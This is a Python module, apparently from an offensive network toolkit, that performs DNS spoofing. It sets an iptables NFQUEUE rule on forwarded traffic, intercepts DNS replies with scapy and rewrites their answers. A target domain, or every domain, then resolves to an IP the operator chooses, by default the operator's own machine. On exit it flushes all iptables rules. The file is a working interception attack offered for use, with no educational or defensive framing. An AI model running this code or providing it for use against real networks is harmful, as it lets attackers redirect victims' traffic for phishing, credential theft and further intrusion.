from . import *
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP

def dns_packet_modify(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    """

    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    
    if (DNS_SPOOF_ALL_DOMAINS.encode() in dns_hosts):
        dns_hosts[qname] = dns_hosts[DNS_SPOOF_ALL_DOMAINS.encode()]
        dns_hosts[qname[0:-1]] = dns_hosts[DNS_SPOOF_ALL_DOMAINS.encode()]

    if (qname not in dns_hosts):
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    
    return packet

def dns_packet_process(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR) and scapy_packet.haslayer(IP) and scapy_packet.haslayer(UDP):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = dns_packet_modify(scapy_packet)
        except IndexError as e:
            print(e)
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()

def input_domain_name(message: str, default: str=None) -> str:
    """
    @brief Input domain name
    @param message: input text message 
    @param default: default domain name (if blank input)
    """

    try:
        print(f"{M_IMPORTANT} {message}", end='')
        domain = input().strip()
        if default and domain == '': # Allow blank input (default taken)
            return default
        return domain
        
    except KeyboardInterrupt:
        print(f"{M_ERROR} Detected CTRL+C!")

def dns_spoofing(net_info: dict):
    """
    Starts the DNS spoofing process.
    """
    global queue, dns_hosts

    print(f'{M_IMPORTANT} DNS Cache Poisoning:')
    domain = input_domain_name(f'Domain ("{DNS_SPOOF_ALL_DOMAINS}": all): ')
    ipv4_dst = input_ipv4(f'IPv4 Address (default: {net_info["self_ipv4"]}): ', net_info['self_ipv4'])
    dns_hosts[(domain).encode()] = ipv4_dst
    dns_hosts[(domain + '.').encode()] = ipv4_dst
    print(dns_hosts)

    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(NETFILTER_QUEUE_NUM))
        queue = NetfilterQueue()

        queue.bind(NETFILTER_QUEUE_NUM, dns_packet_process)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        print(f"{M_ERROR} Detected CTRL+C! Restoring the network, please wait...")
    except Exception as e:
        os.system("iptables --flush")
        print(e)
        sys.exit(1)



